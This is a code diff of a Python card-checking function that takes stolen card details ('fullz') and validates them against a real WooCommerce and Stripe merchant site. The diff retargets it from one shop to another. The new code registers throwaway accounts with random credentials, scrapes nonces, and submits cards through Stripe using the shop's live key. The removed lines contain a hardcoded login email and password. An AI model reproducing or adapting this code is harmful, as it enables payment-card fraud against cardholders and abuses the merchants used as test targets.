@@ -34,6 +34,9 @@ def gets(s: str, start: str, end: str) -> str | None:
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     try:
         cc, mes, ano, cvv = fullz.split("|")
+        user = "renasenomann" + str(random.randint(9999, 574545))
+        mail = "renasenomann" + str(random.randint(9999, 574545)) + "@gmail.com"
+        pwd = "Renasenomann" + str(random.randint(9999, 574545))
 
         # Validate expiration date
         mes = mes.zfill(2)
@@ -57,60 +60,67 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             return json.dumps({"error": {"message": "Expiration Month Invalid"}})
 
         # Request headers etc.
-        headers1 = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'max-age=0',
-            'Connection': 'keep-alive',
-            'Referer': 'https://elearntsg.com/members/parael10/',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'Upgrade-Insecure-Requests': '1',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'priority': 'u=0, i',
+            'referer': 'https://thefloordepot.com.au/',
             'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        # Get login token
-        response = await session.get('https://elearntsg.com/login/', headers=headers1)
-        login_token = gets(response.text, '"learndash-login-form" value="', '" />')
-        if not login_token:
-            return json.dumps({"error": {"message": "Failed to get login token"}})
+        response = await session.get('https://thefloordepot.com.au/my-account/', headers=headers)
 
-        # Login data
-        headers2 = headers1.copy()
-        headers2.update({
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://elearntsg.com',
-            'Referer': 'https://elearntsg.com/login/',
-        })
+        register = gets(response.text, '"woocommerce-register-nonce" value="', '" />')
+        #print(register)
 
-        data_login = {
-            'learndash-login-form': login_token,
-            'pmpro_login_form_used': '1',
-            'log': 'ayasayamaguchi12@signinid.com',   # Ganti akun login sesuai kamu
-            'pwd': 'Ayasa1209',               # Ganti password sesuai kamu
-            'wp-submit': 'Log In',
-            'redirect_to': '',
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://thefloordepot.com.au',
+            'priority': 'u=0, i',
+            'referer': 'https://thefloordepot.com.au/my-account/',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        response = await session.post('https://elearntsg.com/wp-login.php', headers=headers2, data=data_login)
+        data = {
+            'email': mail,
+            'password': pwd,
+            'woocommerce-register-nonce': register,
+            '_wp_http_referer': '/my-account/',
+            'register': 'Register',
+        }
 
-        for url in [
-            'https://elearntsg.com/activity-feed/',
-            'https://elearntsg.com/my-account/payment-methods/',
-            'https://elearntsg.com/my-account/add-payment-method/'
-        ]:
-            response = await session.get(url, headers=headers1)
+        response = await session.post('https://thefloordepot.com.au/my-account/', headers=headers, data=data)
+
+        response = await session.get('https://thefloordepot.com.au/my-account/', headers=headers)
+
+        response = await session.get('https://thefloordepot.com.au/my-account/payment-methods/', headers=headers)
+
+        response = await session.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
 
         nonce = gets(response.text, '"add_card_nonce":"', '"')
-        if not nonce:
-            return json.dumps({"error": {"message": "Failed to get add_card_nonce"}})
+        #print(nonce)
 
-        headers_stripe = {
+        headers = {
             'accept': 'application/json',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
@@ -126,60 +136,59 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
-        data_stripe = {
-            'type':'card',
-            'billing_details[name]':'parael senoman',
-            'billing_details[email]':'parael10@gmail.com',
-            'card[number]': cc,
-            'card[cvc]': cvv,
-            'card[exp_month]': mes,
-            'card[exp_year]': ano,
-            'guid':'6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90',
-            'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
-            'sid':'6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
-            'payment_user_agent':'stripe.js/983ed40936; stripe-js-v3/983ed40936; split-card-element',
-            'referrer':'https://elearntsg.com',
-            'time_on_page':'146631',
-            'client_attribution_metadata[client_session_id]':'026b4312-1f75-4cd9-a40c-456a8883e56c',
-            'client_attribution_metadata[merchant_integration_source]':'elements',
-            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
-            'client_attribution_metadata[merchant_integration_version]':'2017',
-            'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
+        data = {
+        'referrer':'https://thefloordepot.com.au',
+        'type':'card',
+        'owner[name]':' ',
+        'owner[email]': mail,
+        'card[number]': cc,
+        'card[cvc]': cvv,
+        'card[exp_month]': mes,
+        'card[exp_year]': ano,
+        'guid':'e4ecff58-9ae2-4855-91fb-2c376191a5967ce14d',
+        'muid':'13c90888-e237-4e5a-a8e1-791f937d267c22f3d7',
+        'sid':'6d2693a7-3d78-4ced-a2a8-6aa36082a0e39678b1',
+        'pasted_fields':'number',
+        'payment_user_agent':'stripe.js/4ca544af8b; stripe-js-v3/4ca544af8b; split-card-element',
+        'time_on_page':'247071',
+        'key':'pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
         }
 
-        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)
+        response = await session.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
+
         try:
             id = response.json()['id']
+            #print(id)
         except Exception:
             return response.text
 
-        headers_ajax = {
-            'Accept': 'application/json, text/javascript, */*; q=0.01',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Connection': 'keep-alive',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Origin': 'https://elearntsg.com',
-            'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
-            'X-Requested-With': 'XMLHttpRequest',
+        headers = {
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://thefloordepot.com.au',
+            'priority': 'u=1, i',
+            'referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
             'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
         }
 
         params = {
             'wc-ajax': 'wc_stripe_create_setup_intent',
         }
 
-        data_ajax = {
+        data = {
             'stripe_source_id': id,
             'nonce': nonce,
         }
 
-        response = await session.post('https://elearntsg.com/', params=params, headers=headers_ajax, data=data_ajax)
+        response = await session.post('https://thefloordepot.com.au/', params=params, headers=headers, data=data)
 
         return response.text
 
